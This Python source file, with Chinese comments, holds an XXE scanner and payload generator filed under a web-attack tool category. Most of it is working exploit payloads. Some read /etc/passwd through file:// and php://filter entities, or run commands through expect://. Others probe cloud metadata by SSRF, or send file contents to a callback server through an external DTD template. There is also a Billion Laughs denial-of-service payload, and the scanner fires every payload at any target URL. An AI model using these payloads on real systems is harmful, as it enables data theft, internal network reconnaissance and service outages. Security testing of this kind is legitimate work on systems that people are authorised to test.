#!/usr/bin/env python3
"""
XXE漏洞检测工具 - 完整实现
支持: 基础XXE、盲XXE、OOB XXE、参数实体XXE
"""

import requests
import logging
import re
import time
import uuid
from typing import Any, Dict, List, Optional
from dataclasses import dataclass, field
from urllib.parse import urlparse

from core.tool_registry import BaseTool, ToolCategory, ToolParameter

logger = logging.getLogger(__name__)


class XXEPayloadGenerator:
    """XXE Payload生成器"""
    
    @staticmethod
    def file_read(file_path: str = "/etc/passwd") -> List[str]:
        """文件读取payload"""
        return [
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{file_path}">]><foo>&xxe;</foo>',
            f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://{file_path}">]><foo>&xxe;</foo>',
            f'<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file://{file_path}">]><data>&file;</data>',
            # PHP wrapper
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={file_path}">]><foo>&xxe;</foo>',
            # expect wrapper
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
        ]
    
    @staticmethod
    def ssrf(target_url: str = "http://127.0.0.1") -> List[str]:
        """SSRF payload"""
        return [
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{target_url}">]><foo>&xxe;</foo>',
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{target_url}/latest/meta-data/">]><foo>&xxe;</foo>',
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        ]
    
    @staticmethod
    def oob(callback_url: str) -> List[str]:
        """OOB带外数据提取payload"""
        return [
            # 基础OOB
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{callback_url}">]><foo>&xxe;</foo>',
            # 参数实体OOB
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{callback_url}/evil.dtd">%xxe;]>',
            # 数据外带
            f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "{callback_url}/evil.dtd">
  %dtd;
]>
<foo>&send;</foo>''',
            # FTP OOB
            f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "{callback_url}/ftp.dtd">
  %dtd;
  %send;
]>''',
        ]
    
    @staticmethod
    def blind(callback_url: str) -> List[str]:
        """盲XXE payload"""
        return [
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{callback_url}?test=xxe">%xxe;]>',
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{callback_url}?xxe=1">]><foo>&xxe;</foo>',
            # DNS外带
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://xxe.UNIQUE_ID.{urlparse(callback_url).netloc}">]><foo>&xxe;</foo>',
        ]
    
    @staticmethod
    def dos() -> List[str]:
        """DoS payload (Billion Laughs)"""
        return [
            '''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>''',
        ]
    
    @staticmethod
    def parameter_entity(callback_url: str) -> List[str]:
        """参数实体注入"""
        return [
            f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % asd SYSTEM "{callback_url}/xxe.dtd">
  %asd;
  %c;
]>
<foo>&rrr;</foo>''',
            f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "{callback_url}/evil.dtd">
  %dtd;
  %param1;
]>
<foo>&exfil;</foo>''',
        ]


@dataclass
class XXEScannerTool(BaseTool):
    """XXE漏洞扫描器"""
    name: str = "xxe_scanner"
    description: str = "XXE漏洞扫描器 - 检测XML外部实体注入漏洞"
    category: ToolCategory = ToolCategory.WEB_ATTACK
    parameters: List[ToolParameter] = field(default_factory=lambda: [
        ToolParameter("url", "string", "目标URL", required=True),
        ToolParameter("method", "string", "HTTP方法", required=False, default="POST",
                     choices=["GET", "POST", "PUT"]),
        ToolParameter("content_type", "string", "Content-Type", required=False, 
                     default="application/xml",
                     choices=["application/xml", "text/xml", "application/soap+xml"]),
        ToolParameter("callback_url", "string", "OOB回调URL(用于盲XXE)", required=False, default=""),
        ToolParameter("test_file", "string", "测试读取的文件", required=False, default="/etc/passwd"),
        ToolParameter("headers", "string", "自定义Headers(JSON)", required=False, default=""),
        ToolParameter("timeout", "integer", "超时时间(秒)", required=False, default=10),
    ])
    timeout: int = 300
    
    def execute(self, params: Dict[str, Any], session_id: str = None) -> Dict[str, Any]:
        url = params["url"]
        method = params.get("method", "POST").upper()
        content_type = params.get("content_type", "application/xml")
        callback_url = params.get("callback_url", "")
        test_file = params.get("test_file", "/etc/passwd")
        custom_headers = params.get("headers", "")
        req_timeout = params.get("timeout", 10)
        
        results = {
            "success": True,
            "url": url,
            "vulnerabilities": [],
            "tests_performed": 0,
            "details": []
        }
        
        headers = {"Content-Type": content_type}
        if custom_headers:
            try:
                import json
                headers.update(json.loads(custom_headers))
            except Exception as exc:
                logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

        # 1. 测试基础XXE (文件读取)
        file_payloads = XXEPayloadGenerator.file_read(test_file)
        for payload in file_payloads:
            results["tests_performed"] += 1
            vuln = self._test_payload(url, method, payload, headers, req_timeout, "file_read")
            if vuln:
                results["vulnerabilities"].append(vuln)
                results["details"].append(f"文件读取XXE成功: {test_file}")
        
        # 2. 测试SSRF XXE
        ssrf_payloads = XXEPayloadGenerator.ssrf()
        for payload in ssrf_payloads:
            results["tests_performed"] += 1
            vuln = self._test_payload(url, method, payload, headers, req_timeout, "ssrf")
            if vuln:
                results["vulnerabilities"].append(vuln)
        
        # 3. 测试盲XXE (需要callback_url)
        if callback_url:
            unique_id = str(uuid.uuid4())[:8]
            blind_payloads = XXEPayloadGenerator.blind(callback_url)
            for payload in blind_payloads:
                payload = payload.replace("UNIQUE_ID", unique_id)
                results["tests_performed"] += 1
                self._send_payload(url, method, payload, headers, req_timeout)
                results["details"].append(f"盲XXE payload已发送, ID: {unique_id}")
            
            # OOB payloads
            oob_payloads = XXEPayloadGenerator.oob(callback_url)
            for payload in oob_payloads:
                results["tests_performed"] += 1
                self._send_payload(url, method, payload, headers, req_timeout)
            
            results["details"].append(f"请检查OOB服务器 {callback_url} 是否收到回调")
        
        # 4. 测试参数实体
        if callback_url:
            param_payloads = XXEPayloadGenerator.parameter_entity(callback_url)
            for payload in param_payloads:
                results["tests_performed"] += 1
                self._send_payload(url, method, payload, headers, req_timeout)
        
        results["total_vulnerabilities"] = len(results["vulnerabilities"])
        results["is_vulnerable"] = len(results["vulnerabilities"]) > 0
        
        return results
    
    def _test_payload(self, url: str, method: str, payload: str, 
                      headers: Dict, timeout: int, vuln_type: str) -> Optional[Dict]:
        """测试单个payload"""
        try:
            if method == "POST":
                resp = requests.post(url, data=payload, headers=headers, 
                                    timeout=timeout, verify=False)
            elif method == "PUT":
                resp = requests.put(url, data=payload, headers=headers,
                                   timeout=timeout, verify=False)
            else:
                resp = requests.get(url, params={"xml": payload}, headers=headers,
                                   timeout=timeout, verify=False)
            
            # 检测响应中的敏感信息
            indicators = {
                "file_read": [
                    r"root:.*:0:0:",  # /etc/passwd
                    r"\[boot loader\]",  # win.ini
                    r"\[fonts\]",  # win.ini
                    r"daemon:.*:/usr/sbin",
                    r"nobody:.*:/nonexistent",
                ],
                "ssrf": [
                    r"ami-[a-z0-9]+",  # AWS metadata
                    r"instance-id",
                    r"local-hostname",
                ],
                "error": [
                    r"SYSTEM.*file://",
                    r"DOCTYPE.*ENTITY",
                    r"XML.*parser.*error",
                    r"libxml",
                ]
            }
            
            for pattern in indicators.get(vuln_type, []) + indicators.get("error", []):
                if re.search(pattern, resp.text, re.IGNORECASE):
                    return {
                        "type": f"XXE_{vuln_type.upper()}",
                        "payload": payload[:200] + "..." if len(payload) > 200 else payload,
                        "evidence": re.search(pattern, resp.text, re.IGNORECASE).group()[:100],
                        "status_code": resp.status_code,
                        "severity": "critical" if vuln_type == "file_read" else "high"
                    }
            
            return None
            
        except requests.Timeout:
            # 超时可能表示DoS或盲XXE
            return None
        except Exception as e:
            logger.debug(f"XXE测试异常: {e}")
            return None
    
    def _send_payload(self, url: str, method: str, payload: str,
                      headers: Dict, timeout: int):
        """发送payload (不检查响应)"""
        try:
            if method == "POST":
                requests.post(url, data=payload, headers=headers, 
                             timeout=timeout, verify=False)
            elif method == "PUT":
                requests.put(url, data=payload, headers=headers,
                            timeout=timeout, verify=False)
            else:
                requests.get(url, params={"xml": payload}, headers=headers,
                            timeout=timeout, verify=False)
        except Exception as exc:
            logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

@dataclass
class XXEPayloadTool(BaseTool):
    """XXE Payload生成器"""
    name: str = "xxe_payload"
    description: str = "XXE Payload生成器 - 生成各类XXE测试载荷"
    category: ToolCategory = ToolCategory.WEB_ATTACK
    parameters: List[ToolParameter] = field(default_factory=lambda: [
        ToolParameter("type", "string", "Payload类型", required=True,
                     choices=["file_read", "ssrf", "oob", "blind", "dos", "parameter_entity"]),
        ToolParameter("target", "string", "目标(文件路径或URL)", required=False, default="/etc/passwd"),
        ToolParameter("callback_url", "string", "回调URL(OOB/盲XXE需要)", required=False, default=""),
    ])
    timeout: int = 10
    
    def execute(self, params: Dict[str, Any], session_id: str = None) -> Dict[str, Any]:
        payload_type = params["type"]
        target = params.get("target", "/etc/passwd")
        callback_url = params.get("callback_url", "")
        
        payloads = []
        
        if payload_type == "file_read":
            payloads = XXEPayloadGenerator.file_read(target)
        elif payload_type == "ssrf":
            payloads = XXEPayloadGenerator.ssrf(target)
        elif payload_type == "oob":
            if not callback_url:
                return {"success": False, "error": "OOB类型需要callback_url参数"}
            payloads = XXEPayloadGenerator.oob(callback_url)
        elif payload_type == "blind":
            if not callback_url:
                return {"success": False, "error": "盲XXE需要callback_url参数"}
            payloads = XXEPayloadGenerator.blind(callback_url)
        elif payload_type == "dos":
            payloads = XXEPayloadGenerator.dos()
        elif payload_type == "parameter_entity":
            if not callback_url:
                return {"success": False, "error": "参数实体需要callback_url参数"}
            payloads = XXEPayloadGenerator.parameter_entity(callback_url)
        
        # 生成DTD文件内容(用于OOB)
        dtd_content = ""
        if payload_type in ["oob", "parameter_entity"]:
            dtd_content = f'''<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{callback_url}/?data=%file;'>">
%eval;
%exfil;'''
        
        return {
            "success": True,
            "type": payload_type,
            "payloads": payloads,
            "count": len(payloads),
            "dtd_content": dtd_content if dtd_content else None,
            "usage_tips": self._get_tips(payload_type)
        }
    
    def _get_tips(self, payload_type: str) -> str:
        tips = {
            "file_read": "直接在响应中查看文件内容",
            "ssrf": "用于探测内网服务和云元数据",
            "oob": "需要部署DTD文件到callback服务器，数据通过HTTP/DNS外带",
            "blind": "无回显时使用，需要监控callback服务器",
            "dos": "Billion Laughs攻击，谨慎使用",
            "parameter_entity": "绕过某些WAF，需要外部DTD支持"
        }
        return tips.get(payload_type, "")
